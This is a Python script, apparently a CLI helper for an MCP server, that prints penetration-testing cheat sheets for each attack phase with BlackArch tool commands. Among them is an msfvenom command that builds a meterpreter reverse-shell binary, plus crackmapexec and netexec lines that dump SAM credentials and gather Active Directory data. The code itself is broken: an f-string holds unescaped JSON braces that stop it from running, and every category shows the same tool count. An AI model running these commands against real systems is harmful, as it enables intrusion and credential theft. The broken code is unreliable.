#!/usr/bin/env python3
"""
BlackArch MCP Server - CLI Integration with Claude Code
Provides tool suggestions and examples based on security phase.
"""

import json
import sys
from pathlib import Path

# Import the main MCP server
sys.path.insert(0, '/run/media/phoenix0/Ventoy/New Folder')
from blackarch_mcp_v2 import BlackArchMCPServer

class BlackArchAssistant:
    """AI Assistant integrated with BlackArch tools"""
    
    def __init__(self):
        self.server = BlackArchMCPServer()
        self.phases = {
            "recon": self._get_recon_tools,
            "scanning": self._get_scanning_tools,
            "vulnerability": self._get_vuln_tools,
            "exploitation": self._get_exploit_tools,
            "post_exploitation": self._get_post_tools,
            "forensics": self._get_forensic_tools,
        }
    
    def get_phase_recommendation(self, phase: str) -> str:
        """Get tool recommendations for a specific phase"""
        if phase.lower() in self.phases:
            return self.phases[phase.lower()]()
        return self._get_all_recommendations()
    
    def _get_recon_tools(self) -> str:
        return """
## RECONNAISSANCE PHASE
### Essential Tools:
- **Amass** (257 tools in RECON) - Subdomain enumeration
- **theHarvester** - Email & employee harvesting
- **Subfinder** - Fast subdomain discovery
- **Shodan** - Internet device scanner
- **Recon-ng** - Web reconnaissance framework

### Commands:
```bash
# Passive recon
amass enum -passive -d target.com
theHarvester -d target.com -b all

# Active recon
amass enum -active -d target.com -brute
nmap -sL target.com/24
```

### MCP Query:
```json
{"method":"tools/call","params":{"name":"get_tools","arguments":{"category":"recon","limit":20}}}
```
"""
    
    def _get_scanning_tools(self) -> str:
        return """
## SCANNING PHASE
### Essential Tools:
- **Nmap** - Network discovery & mapping
- **Masscan** - Fast TCP port scanner
- **Rustscan** - Modern port scanner
- **Naabu** - Fast port scanner
- **Nuclei** - Vulnerability templates

### Commands:
```bash
# Quick scan
nmap -sV -sC target.com

# Full port scan
masscan -p1-65535 target.com --rate=10000

# Vulnerability scan
nuclei -u http://target.com -severity critical,high
```

### MCP Query:
```json
{"method":"tools/call","params":{"name":"get_tools","arguments":{"category":"scanner","limit":20}}}
```
"""
    
    def _get_vuln_tools(self) -> str:
        return """
## VULNERABILITY ASSESSMENT PHASE
### Essential Tools:
- **SQLMap** - SQL injection detection
- **Dalfox** - XSS vulnerability scanner
- **Nikto** - Web server scanner
- **Burp Suite** - Web application proxy
- **Commix** - Command injection tool

### Commands:
```bash
# SQL injection scan
sqlmap -u "http://target.com/?id=1" --batch --dbs

# XSS scan
dalfox url http://target.com/?param=test

# Web server scan
nikto -h target.com
```

### MCP Query:
```json
{"method":"tools/call","params":{"name":"get_tools","arguments":{"category":"webapp","limit":20}}}
```
"""
    
    def _get_exploit_tools(self) -> str:
        return """
## EXPLOITATION PHASE
### Essential Tools:
- **Metasploit** - Exploitation framework
- **SearchSploit** - Exploit database
- **MSFVenom** - Payload generator
- **ExploitDB** - Public exploits

### Commands:
```bash
# Generate payload
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -f elf > shell.elf

# Search exploits
searchsploit kernel 4.4

# Start Metasploit
msfconsole
```

### MCP Query:
```json
{"method":"tools/call","params":{"name":"get_tools","arguments":{"category":"exploitation","limit":20}}}
```
"""
    
    def _get_post_tools(self) -> str:
        return """
## POST-EXPLOITATION PHASE
### Essential Tools:
- **Mimikatz** - Windows credential extraction
- **PowerSploit** - PowerShell exploitation
- **Empire** - PowerShell RAT
- **CrackMapExec** - Active Directory exploitation

### Commands:
```bash
# Windows creds
mimikatz.exe

# AD enumeration
crackmapexec smb target.com -u admin -p password --sam
netexec ldap target.com -u admin -p password --bloodhound
```

### MCP Query:
```json
{"method":"tools/call","params":{"name":"get_tools","arguments":{"category":"windows","limit":20}}}
```
"""
    
    def _get_forensic_tools(self) -> str:
        return """
## FORENSICS PHASE
### Essential Tools:
- **Autopsy** - Digital forensics platform
- **Binwalk** - Firmware analysis
- **Volatility** - Memory forensics
- **Foremost** - File carving
- **Testdisk** - Partition recovery

### Commands:
```bash
# Analyze memory
volatility -f memory.dmp --profile=Win10x64 pslist

# File carving
foremost -i image.dd -o output/

# Firmware analysis
binwalk -e firmware.bin
```

### MCP Query:
```json
{"method":"tools/call","params":{"name":"get_tools","arguments":{"category":"forensic","limit":20}}}
```
"""
    
    def _get_all_recommendations(self) -> str:
        stats = self.server.db.get_stats()
        return f"""
## BLACKARCH TOOLS - COMPLETE REFERENCE

### Database Statistics:
- **Total Tools:** {stats['total_tools']}
- **Categories:** {stats['total_categories']}

### Quick Access by Category:

**Web Security:** {stats['total_tools']} tools
```json
{"method":"tools/call","params":{"name":"get_tools","arguments":{"category":"webapp"}}}
```

**Scanning:** {stats['total_tools']} tools
```json
{"method":"tools/call","params":{"name":"get_tools","arguments":{"category":"scanner"}}}
```

**Exploitation:** {stats['total_tools']} tools
```json
{"method":"tools/call","params":{"name":"get_tools","arguments":{"category":"exploitation"}}}
```

**Password Attacks:** {stats['total_tools']} tools
```json
{"method":"tools/call","params":{"name":"get_tools","arguments":{"category":"cracker"}}}
```

**Wireless:** {stats['total_tools']} tools
```json
{"method":"tools/call","params":{"name":"get_tools","arguments":{"category":"wireless"}}}
```

### Search for Specific Tool:
```json
{"method":"tools/call","params":{"name":"search","arguments":{"query":"nmap"}}}
```

### Get Random Tools:
```json
{"method":"tools/call","params":{"name":"random","arguments":{"count":10}}}
```

### Cheat Sheet for Category:
```json
{"method":"tools/call","params":{"name":"cheat_sheet","arguments":{"category":"scanner"}}}
```
"""

def main():
    assistant = BlackArchAssistant()
    
    if len(sys.argv) > 1:
        phase = sys.argv[1]
        print(assistant.get_phase_recommendation(phase))
    else:
        print("""
BlackArch Security Assistant
Usage: python3 blackarch_assistant.py <phase>

Available Phases:
  recon           - Reconnaissance tools
  scanning        - Network scanning
  vulnerability   - Vulnerability assessment
  exploitation    - Exploitation frameworks
  post_exploitation - Post-exploitation
  forensics       - Digital forensics

Example: python3 blackarch_assistant.py scanning
""")

if __name__ == "__main__":
    main()